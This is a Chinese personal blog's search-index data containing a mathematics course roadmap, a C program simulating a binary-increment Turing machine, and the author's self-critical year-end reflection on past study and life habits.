图论","date":"2025-01-23","objectID":"/math-journey/:11:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#图论"},{"categories":["数学"],"content":" 12 初等数论","date":"2025-01-23","objectID":"/math-journey/:12:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#初等数论"},{"categories":["数学"],"content":" 13 离散数学","date":"2025-01-23","objectID":"/math-journey/:13:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#离散数学"},{"categories":["数学"],"content":" 14 算法入门","date":"2025-01-23","objectID":"/math-journey/:14:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#算法入门"},{"categories":["数学"],"content":" 15 数据结构与算法分析","date":"2025-01-23","objectID":"/math-journey/:15:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#数据结构与算法分析"},{"categories":["数学"],"content":" 16 算法设计与分析","date":"2025-01-23","objectID":"/math-journey/:16:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#算法设计与分析"},{"categories":["数学"],"content":" 17 计算理论","date":"2025-01-23","objectID":"/math-journey/:17:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#计算理论"},{"categories":["数学"],"content":" 18 计算复杂性理论","date":"2025-01-23","objectID":"/math-journey/:18:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#计算复杂性理论"},{"categories":["数学"],"content":" 19 信息论与编码","date":"2025-01-23","objectID":"/math-journey/:19:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#信息论与编码"},{"categories":["数学"],"content":" 20 理论计算机导论","date":"2025-01-23","objectID":"/math-journey/:20:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#理论计算机导论"},{"categories":["数学"],"content":" 21 计算几何","date":"2025-01-23","objectID":"/math-journey/:21:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#计算几何"},{"categories":["数学"],"content":" 22 密码学","date":"2025-01-23","objectID":"/math-journey/:22:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#密码学"},{"categories":["数学"],"content":" 23 最优化方法","date":"2025-01-23","objectID":"/math-journey/:23:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#最优化方法"},{"categories":["数学"],"content":" 24 解析几何","date":"2025-01-23","objectID":"/math-journey/:24:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#解析几何"},{"categories":["数学"],"content":" 25 数值分析","date":"2025-01-23","objectID":"/math-journey/:25:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#数值分析"},{"categories":["数学"],"content":" 26 矩阵计算","date":"2025-01-23","objectID":"/math-journey/:26:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#矩阵计算"},{"categories":["数学"],"content":" 27 矩阵论 学到这里以后可以学习计算机，计算机内容学习完成后再来继续后面的纯数学习路径。 ","date":"2025-01-23","objectID":"/math-journey/:27:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#矩阵论"},{"categories":["数学"],"content":" 28 纯数学习路径","date":"2025-01-23","objectID":"/math-journey/:28:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#纯数学习路径"},{"categories":["数学"],"content":" 29 USTC数学修课指南第三版","date":"2025-01-23","objectID":"/math-journey/:29:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#ustc数学修课指南第三版"},{"categories":["数学"],"content":" 30 常用教科書列表與簡評 | 臺大數學系 (ntu.edu.tw)","date":"2025-01-23","objectID":"/math-journey/:30:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#常用教科書列表與簡評--臺大數學系-ntuedutw"},{"categories":["数学"],"content":" 31 MIT 数学学习路径","date":"2025-01-23","objectID":"/math-journey/:31:0","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#mit-数学学习路径"},{"categories":["数学"],"content":" 31.1 MIT 计算机数学 18.02 Multivariable Calculus 18.06 Linear Algebra 18.03 x Differential Equations 18.03 SC 18.034 Honor Differential Equations 18.065 Matrix Methods in Data Analysis, Signal Processing, and Machine Learning Signal Processing \u0026 Electronics 6.01 Intro to EECS I 6.00 Introduction to Computer Science and Programming 6.100 A Introduction to Computer Science Programming in Python 6.0002 Introduction to Computational Thinking and data Science 6.02 Intro to EECS II UCB EE 16 A UCB EE 16 B 6.002 Circuits and Electronics 6.003 Signals and Systems UCB EE 120 Signals and Systems mitmath/18065: 18.065/18.0651: Matrix Methods in Data Analysis, Signal Processing, and Machine Learning (github.com) 现代版 Notes 阅读 mitmath/18065: 18.065/18.0651: Matrix Methods in Data Analysis, Signal Processing, and Machine Learning (github.com) Problem Sets 完成 UCB Data 8 UCB Data 100 Harvard CS 109 A 18.05 Introduction to Probability and Statistics 6.3700 Introduction to Probability 6.3800 Introduction to Inference 18.05 Introduction to Probability and Statistics 18.600 Probability and Random Variables 18.650 Fundamentals of Statistics 6.042 J Mathematics for Computer Science Intro to Mathematical Reasoning Principles of discrete Applied mathematics 18.510 Introduction to Mathematical Logic and Set Theory 18.504 Seminar in Logic 18.515 Mathematical Logic 18.700 Advanced Linear Algebra 18.700 Course page (mit.edu) 现代版 Reading 完成并总结，总结见此 18.700 Course page (mit.edu) 现代版 Problem Sets 完成并总结，总结见此 Math 115A (ucla.edu) 陶哲轩亲授：linear-algebra-notes.pdf (wordpress.com) 18.303 Linear Partial Differential Equations: Analysis and Numerics 18.330 Introduction to Numerical Analysis 18.04 Complex Variables with applications 18.100A Real Analysis 18.100B Real Analysis 18.100P Real Analysis 18.100Q Real Analysis 18.S190 Introduction To Metric Spaces 或 18.S190, IAP 2023 (mit.edu) 18. S191 index — Interactive Computational Thinking — MIT 18.701 Algebra I 18.335[J] Introduction to Numerical Methods 6.7300[J] Introduction to Modeling and Simulation 16.920[J] Numerical Methods for Partial Differential Equations 18.085 Computational Science and Engineering I 18.336[J] Fast Methods for Partial Differential and Integral Equation 18. C 06 Linear Algebra and Optimization Linear Algebra and Optimization for Machine Learning 阅读 cis515-13-sl1-a.pdf (upenn.edu) Introduction to Applied Linear Algebra – Vectors, Matrices, and Least Squares (stanford.edu) 18.204 Undergraduate Seminar in Discrete Mathematics 18.211 Combinatorial Analysis 6.120A Discrete Mathematics and Proof for Computer Science 6.1210 Introduction to Algorithms 6.045 J Automata, Computability, and Complexity 18.400[J] Computability and Complexity Theory 18.404 Theory of Computation 18.410[J] Design and Analysis of Algorithms 18.424 Seminar in Information Theory 18.434 Seminar in Theoretical Computer Science 18.453 Combinatorial Optimization 18.337[J] Parallel Computing and Scientific Machine Learning 18.338 Eigenvalues of Random Matrices 18.367 Waves and Imaging University Physics 《University Physics》阅读并做笔记，笔记见此 Yale Fundamentals of physics I 学习 Yale Fundamentals of physics II 学习 Classical Mechanics 学习 Physics II: Electricity and Magnetism 学习 Relativity 学习 Physics III: Vibrations and Waves 18.415[J] Advanced Algorithms 18.416[J] Randomized Algorithms 18.425[J] Foundations of Cryptography 8.01 Physics I 8.02 Physics II 8.03 Physics III 8.04 Quantum Physics I 8.041 Quantum Physics I 8.05 Quantum Physics II 18.435[J] Quantum Computation 18.437[J] Distributed Algorithms 18.455 Advanced Combinatorial Optimization 18.702 Algebra II 18.703 Modern Algebra 18.783 Elliptic Curves 18.102 Introduction to Functional Analysis 18.112 Functions of a Complex Variable 18.303 Linear Partial Differential Equations 18.642 Topics in Mathematics with Applications in Finance 18.125 Measure Theory and Analysis 18.675 Theory of Probability 18.676 Stochastic Calculus 18.615 Introduction to Stochastic Processes 18.657 Topics in Statistics 18.9","date":"2025-01-23","objectID":"/math-journey/:31:1","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#mit-计算机数学"},{"categories":["数学"],"content":" 31.2 MIT 纯数部分 31.2.1 代数 18.704 Seminar in algebra 18.782 Introduction to Arithmetic Geometry 18.706 Noncommutative algebra 18.755 Lie Groups and Lie Algebras II 18.755 Lie Groups and Lie Algebras II 31.2.2 分析与几何 18.101 Analysis and Manifolds 18.102 Introduction to Functional Analysis 18.103 Fourier Analysis: Theory and Applications 18.104 Seminar in Analysis 18.112 Functions of a Complex variable 18.152 Introduction to Partial Differential Equations 18.950 Differential Geometry 18.994 Seminar in Geometry 18.125 Measure Theory and Analysis 18.155 Differential Analysis I 18.156 Differential Analysis II 18.952 Theory of Differential Forms 18.965 Geometry of Manifolds I 18.966 Geometry of Manifolds II 31.2.3 数论 18.781 Theory of numbers 18.784 Seminar in Number Theory 18.785 Number Theory I 31.2.4 概率与统计 18.677 Topics in Stochastic Processes 18.655 Mathematical Statistics 31.2.5 拓扑与几何 18.904 Seminar in Topology 18.116 Riemann Surfaces 18.905 Algebraic Topology I 18.906 Algebraic Topology II ","date":"2025-01-23","objectID":"/math-journey/:31:2","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#mit-纯数部分"},{"categories":["数学"],"content":" 31.2 MIT 纯数部分 31.2.1 代数 18.704 Seminar in algebra 18.782 Introduction to Arithmetic Geometry 18.706 Noncommutative algebra 18.755 Lie Groups and Lie Algebras II 18.755 Lie Groups and Lie Algebras II 31.2.2 分析与几何 18.101 Analysis and Manifolds 18.102 Introduction to Functional Analysis 18.103 Fourier Analysis: Theory and Applications 18.104 Seminar in Analysis 18.112 Functions of a Complex variable 18.152 Introduction to Partial Differential Equations 18.950 Differential Geometry 18.994 Seminar in Geometry 18.125 Measure Theory and Analysis 18.155 Differential Analysis I 18.156 Differential Analysis II 18.952 Theory of Differential Forms 18.965 Geometry of Manifolds I 18.966 Geometry of Manifolds II 31.2.3 数论 18.781 Theory of numbers 18.784 Seminar in Number Theory 18.785 Number Theory I 31.2.4 概率与统计 18.677 Topics in Stochastic Processes 18.655 Mathematical Statistics 31.2.5 拓扑与几何 18.904 Seminar in Topology 18.116 Riemann Surfaces 18.905 Algebraic Topology I 18.906 Algebraic Topology II ","date":"2025-01-23","objectID":"/math-journey/:31:2","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#代数"},{"categories":["数学"],"content":" 31.2 MIT 纯数部分 31.2.1 代数 18.704 Seminar in algebra 18.782 Introduction to Arithmetic Geometry 18.706 Noncommutative algebra 18.755 Lie Groups and Lie Algebras II 18.755 Lie Groups and Lie Algebras II 31.2.2 分析与几何 18.101 Analysis and Manifolds 18.102 Introduction to Functional Analysis 18.103 Fourier Analysis: Theory and Applications 18.104 Seminar in Analysis 18.112 Functions of a Complex variable 18.152 Introduction to Partial Differential Equations 18.950 Differential Geometry 18.994 Seminar in Geometry 18.125 Measure Theory and Analysis 18.155 Differential Analysis I 18.156 Differential Analysis II 18.952 Theory of Differential Forms 18.965 Geometry of Manifolds I 18.966 Geometry of Manifolds II 31.2.3 数论 18.781 Theory of numbers 18.784 Seminar in Number Theory 18.785 Number Theory I 31.2.4 概率与统计 18.677 Topics in Stochastic Processes 18.655 Mathematical Statistics 31.2.5 拓扑与几何 18.904 Seminar in Topology 18.116 Riemann Surfaces 18.905 Algebraic Topology I 18.906 Algebraic Topology II ","date":"2025-01-23","objectID":"/math-journey/:31:2","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#分析与几何"},{"categories":["数学"],"content":" 31.2 MIT 纯数部分 31.2.1 代数 18.704 Seminar in algebra 18.782 Introduction to Arithmetic Geometry 18.706 Noncommutative algebra 18.755 Lie Groups and Lie Algebras II 18.755 Lie Groups and Lie Algebras II 31.2.2 分析与几何 18.101 Analysis and Manifolds 18.102 Introduction to Functional Analysis 18.103 Fourier Analysis: Theory and Applications 18.104 Seminar in Analysis 18.112 Functions of a Complex variable 18.152 Introduction to Partial Differential Equations 18.950 Differential Geometry 18.994 Seminar in Geometry 18.125 Measure Theory and Analysis 18.155 Differential Analysis I 18.156 Differential Analysis II 18.952 Theory of Differential Forms 18.965 Geometry of Manifolds I 18.966 Geometry of Manifolds II 31.2.3 数论 18.781 Theory of numbers 18.784 Seminar in Number Theory 18.785 Number Theory I 31.2.4 概率与统计 18.677 Topics in Stochastic Processes 18.655 Mathematical Statistics 31.2.5 拓扑与几何 18.904 Seminar in Topology 18.116 Riemann Surfaces 18.905 Algebraic Topology I 18.906 Algebraic Topology II ","date":"2025-01-23","objectID":"/math-journey/:31:2","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#数论"},{"categories":["数学"],"content":" 31.2 MIT 纯数部分 31.2.1 代数 18.704 Seminar in algebra 18.782 Introduction to Arithmetic Geometry 18.706 Noncommutative algebra 18.755 Lie Groups and Lie Algebras II 18.755 Lie Groups and Lie Algebras II 31.2.2 分析与几何 18.101 Analysis and Manifolds 18.102 Introduction to Functional Analysis 18.103 Fourier Analysis: Theory and Applications 18.104 Seminar in Analysis 18.112 Functions of a Complex variable 18.152 Introduction to Partial Differential Equations 18.950 Differential Geometry 18.994 Seminar in Geometry 18.125 Measure Theory and Analysis 18.155 Differential Analysis I 18.156 Differential Analysis II 18.952 Theory of Differential Forms 18.965 Geometry of Manifolds I 18.966 Geometry of Manifolds II 31.2.3 数论 18.781 Theory of numbers 18.784 Seminar in Number Theory 18.785 Number Theory I 31.2.4 概率与统计 18.677 Topics in Stochastic Processes 18.655 Mathematical Statistics 31.2.5 拓扑与几何 18.904 Seminar in Topology 18.116 Riemann Surfaces 18.905 Algebraic Topology I 18.906 Algebraic Topology II ","date":"2025-01-23","objectID":"/math-journey/:31:2","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#概率与统计"},{"categories":["数学"],"content":" 31.2 MIT 纯数部分 31.2.1 代数 18.704 Seminar in algebra 18.782 Introduction to Arithmetic Geometry 18.706 Noncommutative algebra 18.755 Lie Groups and Lie Algebras II 18.755 Lie Groups and Lie Algebras II 31.2.2 分析与几何 18.101 Analysis and Manifolds 18.102 Introduction to Functional Analysis 18.103 Fourier Analysis: Theory and Applications 18.104 Seminar in Analysis 18.112 Functions of a Complex variable 18.152 Introduction to Partial Differential Equations 18.950 Differential Geometry 18.994 Seminar in Geometry 18.125 Measure Theory and Analysis 18.155 Differential Analysis I 18.156 Differential Analysis II 18.952 Theory of Differential Forms 18.965 Geometry of Manifolds I 18.966 Geometry of Manifolds II 31.2.3 数论 18.781 Theory of numbers 18.784 Seminar in Number Theory 18.785 Number Theory I 31.2.4 概率与统计 18.677 Topics in Stochastic Processes 18.655 Mathematical Statistics 31.2.5 拓扑与几何 18.904 Seminar in Topology 18.116 Riemann Surfaces 18.905 Algebraic Topology I 18.906 Algebraic Topology II ","date":"2025-01-23","objectID":"/math-journey/:31:2","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#拓扑与几何"},{"categories":["数学"],"content":" 31.3 MIT 其他方向应用数学 31.3.1 物理数学 18.300 Principles of Continuum Applied mathematics 18.352[J] Nonlinear Dynamics: The Natural Environment 18.353[J] Nonlinear Dynamics: Chaos 18.354[J] Nonlinear Dynamics: Continuum Systems 18.384 Undergraduate Seminar in Physical mathematics 18.417 Introduction to Computational Molecular Biology 18.305 Advanced Analytic Methods in Science and Engineering 18.306 Advanced Partial Differential Equations with Applications 2.25 Fluid Mechanics 12.800 Fluid Dynamics of the Atmosphere and Ocean 18.355 Fluid Mechanics 18.357 Interfacial Phenomena 18.367 Waves and Imaging 8.07 Electromagnetism II 18.369[J] Mathematical Methods in Nanophotonics 2.003[J] Dynamics and Control I 18.075 Methods for Scientists and Engineers 18.376[J] Wave Propagation 18.377[J] Nonlinear Dynamics and Waves ","date":"2025-01-23","objectID":"/math-journey/:31:3","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#mit-其他方向应用数学"},{"categories":["数学"],"content":" 31.3 MIT 其他方向应用数学 31.3.1 物理数学 18.300 Principles of Continuum Applied mathematics 18.352[J] Nonlinear Dynamics: The Natural Environment 18.353[J] Nonlinear Dynamics: Chaos 18.354[J] Nonlinear Dynamics: Continuum Systems 18.384 Undergraduate Seminar in Physical mathematics 18.417 Introduction to Computational Molecular Biology 18.305 Advanced Analytic Methods in Science and Engineering 18.306 Advanced Partial Differential Equations with Applications 2.25 Fluid Mechanics 12.800 Fluid Dynamics of the Atmosphere and Ocean 18.355 Fluid Mechanics 18.357 Interfacial Phenomena 18.367 Waves and Imaging 8.07 Electromagnetism II 18.369[J] Mathematical Methods in Nanophotonics 2.003[J] Dynamics and Control I 18.075 Methods for Scientists and Engineers 18.376[J] Wave Propagation 18.377[J] Nonlinear Dynamics and Waves ","date":"2025-01-23","objectID":"/math-journey/:31:3","series":null,"tags":["学习记录","数学"],"title":"我的数学之旅","uri":"/math-journey/#物理数学"},{"categories":["理论计算机"],"content":" 1 图灵机设计对二进制加法过程进行分析，我们可以得出如下过程： 使用小端法在纸带上存储输入的二进制串，即低位放在最左边 第一格是blank，也就是空，最后我们会回退到这个状态，来进入halt状态 最初是start状态，经过blank后改为carry状态 carry状态下，如果最低为是 0，那么直接将其加 1，然后返回（向左行走）即可，进入back状态 carry状态下，如果最低为是 1，将其改为 0，保持carry状态向右行走，继续对高位进行修改 如果在carry状态下遇到blank，也就是最高位还有进位，那么将blank改为 1 在回退状态下，一般来说只会遇到0，保留 0 不动，继续回退 达到halt之后停止操作，打印字符串 那么，在该图灵机中，我们需要使用到如下几个状态： start，即开始状态 carry，进位状态 back，回退状态 halt，停止状态 有如下几种符号： blank，表示空 0，即二进制符号 0 1，即二进制符号 1 根据设计，图灵机定义二进制加法的计算过程如下： start, blank-\u003eblank, RIGHT, carry carry, 1 -\u003e 0, RIGHT, carry carry, blank-\u003e1, LEFT, back carry, 0-\u003e1, LEFT, back back, 0-\u003e0, LEFT, back back, blank-\u003eblank, halt ","date":"2025-01-12","objectID":"/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E6%B3%95%E5%9B%BE%E7%81%B5%E6%9C%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/:1:0","series":null,"tags":["图灵机","计算理论"],"title":"二进制加法图灵机的C语言实现","uri":"/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E6%B3%95%E5%9B%BE%E7%81%B5%E6%9C%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/#图灵机设计"},{"categories":["理论计算机"],"content":" 2 C 语言代码实现 c // Turing machines for computations. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #define N 4 // the number of states #define M 3 // the number of symbols #define TAPE_SIZE 20 // the size of the tape enum direction { LEFT, RIGHT, STAY }; /** * @brief encoding for binary addtion * 1. 4 states start:0 carry:1 back:2 halt:3 * 2. 3 symbols 0-\u003e0 1-\u003e1 blank-\u003e2 */ enum STATE { START, CARRY, BACK, HALT }; enum SYMBOL { SYMBOL_0, SYMBOL_1, BLANK }; int state_arr [N]; // state_arr[0] as start state, state_arr[N-2] as accept state, state_arr[N-1] as reject state int symbol_arr[M]; // symbol_arr[0] as empty symbol int tape[TAPE_SIZE]; typedef struct head { int location; // the location of the head int state_num; // the state of the head } head_t; typedef struct action { int head_state; int current_symbol; int next_symbol; enum direction dir; int next_state; } action_t; /** * @brief turing machine for binary addition * 1. start, blank-\u003eblank, RIGHT, carry * 2. carry, 1 -\u003e 0, RIGHT, carry * 3. carry, blank-\u003e1, LEFT, back * 4. carry, 0-\u003e1, LEFT, back * 5. back, 0-\u003e0, LEFT, back * 6. back, blank-\u003eblank, halt */ action_t turing_machine(action_t act) { if (act.head_state == state_arr[START] \u0026\u0026 act.current_symbol == symbol_arr[BLANK]) { act.next_symbol = act.current_symbol; act.dir = RIGHT; act.next_state = state_arr[CARRY]; } else if (act.head_state == state_arr[CARRY] \u0026\u0026 act.current_symbol == symbol_arr[SYMBOL_1]) { act.next_symbol = symbol_arr[SYMBOL_0]; act.dir = RIGHT; act.next_state = act.head_state; } else if (act.head_state == state_arr[CARRY] \u0026\u0026 act.current_symbol == symbol_arr[BLANK]) { act.next_symbol = symbol_arr[SYMBOL_1]; act.dir = LEFT; act.next_state = state_arr[BACK]; } else if (act.head_state == state_arr[CARRY] \u0026\u0026 act.current_symbol == symbol_arr[SYMBOL_0]) { act.next_symbol = symbol_arr[SYMBOL_1]; act.dir = LEFT; act.next_state = state_arr[BACK]; } else if (act.head_state == state_arr[BACK] \u0026\u0026 act.current_symbol == symbol_arr[SYMBOL_0]) { act.next_symbol = act.current_symbol; act.dir = LEFT; act.next_state = state_arr[BACK]; } else if (act.head_state == state_arr[BACK] \u0026\u0026 act.current_symbol == symbol_arr[BLANK]) { act.next_symbol = act.current_symbol; act.dir = STAY; act.next_state = state_arr[HALT]; } return act; } void state_transition(char* s, int length) { // initiliaze the state array and symbol array for (int i = 0; i \u003c N; i++) { state_arr[i] = i; } for (int i = 0; i \u003c M; i++) { symbol_arr[i] = i; } // initialize the tape for (int i = 0; i \u003c TAPE_SIZE; i++) { tape[i] = BLANK; // initialize all tape as blank } for (int i = 0; i \u003c length; i++) { tape[i + 1] = s[i] - '0'; } // initialize the head head_t h; h.location = 0; h.state_num = state_arr[START]; // initialie the action action_t a; a.dir = STAY; // define the state transition while (h.state_num != 3) { a.head_state = h.state_num; a.current_symbol = tape[h.location]; a = turing_machine(a); tape[h.location] = a.next_symbol; // update the head if (a.dir == RIGHT) { h.location += 1; } else if (a.dir == LEFT) { h.location -= 1; } h.state_num = a.next_state; } // print the added string for (int i = length; i \u003e= 1; i--) { printf(\"%d\", tape[i]); } } int main(void) { printf(\"Input the binary string: \"); char* s = (char*)malloc(10 * sizeof(char)); scanf(\"%s\", s); // reverse the string, and enter it into turing machine int length = strlen(s); for (int i = 0; i \u003c length / 2; i++) { char temp = s[length - 1 - i]; s[length - 1 - i] = s[i]; s[i] = temp; } state_transition(s, strlen(s)); return 0; } ","date":"2025-01-12","objectID":"/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E6%B3%95%E5%9B%BE%E7%81%B5%E6%9C%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/:2:0","series":null,"tags":["图灵机","计算理论"],"title":"二进制加法图灵机的C语言实现","uri":"/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E6%B3%95%E5%9B%BE%E7%81%B5%E6%9C%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/#c-语言代码实现"},{"categories":null,"content":"对自己过去二十多年的错误的一个总结，主要是心理上的和行动力上的，为后面的人生打通道路","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/"},{"categories":null,"content":"我过去二十来年过的比较失败，现在我要对过去二十来年的失败经历原因进行一个总结，来为我后面的人生开辟新的道路。人一定要不停的反思自己，才能继续成长。 ","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/:0:0","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/#"},{"categories":null,"content":" 1 小学阶段 对学习没概念，没方法，学不好 没刷过题，不知道怎么刷题 不了解考试升学，就知道玩 不知道和人打交道，像个闷葫芦 没有多样的兴趣爱好，玩也不会玩 对很多事情没兴趣，也不知道该干什么 自信心缺失，外带受到学校老师的打击，更是没有自信，到后期沉默寡言 ","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/:1:0","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/#小学阶段"},{"categories":null,"content":" 2 中学阶段 会了一点学习，但是依然对升学考试没啥概念，只知道学校里的月考 不知道要自己额外努力来获取知识，不知道自己买辅导书刷，就知道一个课本一个重难点 学习没有章法，也缺乏优秀老师的指引 后期想通过刷题进步，但是知识也不知道怎么总结，对知识本身没有深刻的了解 整天就是幻想自己变得很厉害，而且表面上做了大量的工作，但是实际上没有深入的思考知识的本源，导致效果很不好 自信心依然不多，虽然开朗了一些 不会探索其他的兴趣爱好，不会玩，不知道很多新奇事物的存在 整天用电脑就是打游戏，不知道编程是什么，家里也没有人教 不了解一些升学考试政策，只知道闷头学习 ","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/:2:0","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/#中学阶段"},{"categories":null,"content":" 3 大学阶段 因为外貌条件不好，依然对自己不太有自信，找不到对象，学长也不喜欢我 努力学习过，但是因为有信息差，所以在很长一段时间内没有找到学习的目标，没有正确的学习资料、学习路径、学习方法 出于对保研的渴望打了一些比赛，也获取了一些成绩 没有实质上的能力强化，只是有一些成绩的加持，实际上能力不强 因为了解自己的水平，对自己的能力也没有什么自信 保研失败后开始彻底摆烂，没有抓紧时间，虚度光阴，浑浑噩噩的过 没有努力考研，没有找工作 行动力差，总是放纵自己，对自己很宽容，一搞就休息休息 对别人太好，像个老好人，所以总是受人欺负 不知道通过努力去抓住机会，不知道自己去争取机会 保研失败后，没有目标，没有努力的动力，整天就是浑浑噩噩，对待考研也是随随便便，最后自然是没有考上 行动力差，执行力差，专注力差，精神内耗严重，最后导致大失败 ","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/:3:0","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/#大学阶段"},{"categories":null,"content":" 4 大学毕业后阶段 固执己见，固步自封， 整天想着学习学习，而没有与外面人交流，没有去抓住机会找工作 想要考研改变命运，但是在考研阶段陷入了完美主义，想要把所有课程都学完后再来进行考研复习工作，结果为时已晚 目标感不强，没有为了考研一心努力，而是花费了很多时间去做一些额外的准备工作 依然是行动力不强，执行力不强，专注力不强，没有面对当下，而是整天幻想，最终陷入大失败 精神内耗严重，总是为了一些不该思考的事情耗费大量的精力 总是忍不住把自己和别人比较，觉得自己跟别人比好失败，最终陷入严重的精神内耗，拖延了大量的时间 觉得自己很失败，对于未来有迷茫和恐惧，所以不敢向前，也不敢迈出去 本质上还是不相信自己能够通过努力改变命运，陷入了习得性无助 对于时间没有把握，太过放纵自己，经常感觉时间很多，对于自己有盲目的自信，所以一直悠哉游哉 但是在最终考研deadline到来的时候，又发现时间其实很紧张，一下子又变得很焦虑 对于挑战没有挑战过的事情没有信心（比如雅思和留学申请），对于生活和未来没有信心 生活自理能力不强，总是要依赖家里照顾，一直泡在舒适区里 身体不好，没有旺盛的精力，经常郁郁寡欢 总是在自信和焦虑之间反复横跳，每次一焦虑就试图通过放纵享乐来放松自己，然后再回来后重新陷入焦虑 没有一个强大的内心，没有一个好的精神状态，一遇到什么事情就焦躁的停不下来，一搞就失眠，让妈妈也为我担心 总是让父母为了我担心，为了我操劳 不敢和人打交道，脸皮太薄，总是有畏惧感，总的来说还是对自己没有自信 对于外貌依然是没有什么讲究，还是我行我素，家里多次提意见让我打理打理，我就是没有听从，减肥也是断断续续，没有坚持，最终也没有找到对象 没有钱 ","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/:4:0","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/#大学毕业后阶段"},{"categories":null,"content":" 5 需要改进的点 多搜集知乎上的学习攻略、学习资料、学习路径和学习意见。对于特定的考试，要有专门的备考方案，不可自己瞎琢磨瞎搞。 对于考试，要多多刷题，在刷题过程中深入的思考，进行总结 在学习过程中要抓紧时间，同时要合理安排时间，不要透支身体去做事 需要上网通过各种渠道多了解考试政策，而不是固步自封， 固执己见，闭门造车 要对自己的人生有极强的方向感和目标感，为了目标去奋进，而不是活在幻想里和真空里 不能放纵自己，只有努力才有美好的明天 要多多上网或者在生活中和人打交道，不可做一个闷葫芦，这样对社会生存没有好处 在有了经济基础后，可以多多培养兴趣爱好 对人生要有方向，有目标感 培养个人自信，通过努力运动健身改进外貌开始 要多多和人打交道，不要害怕受伤，脸皮要厚 对升学考试、社会考试和其他一些政策要有概念，不是说到了点才去准备它，不是说到了时候了才去学习它，提前就要知道这些东西 对于特定的考试，要自己买辅导书来刷，不要自己闭门造车（这是很大的问题！），参考网上其他人的学习路径和学习方法来进行 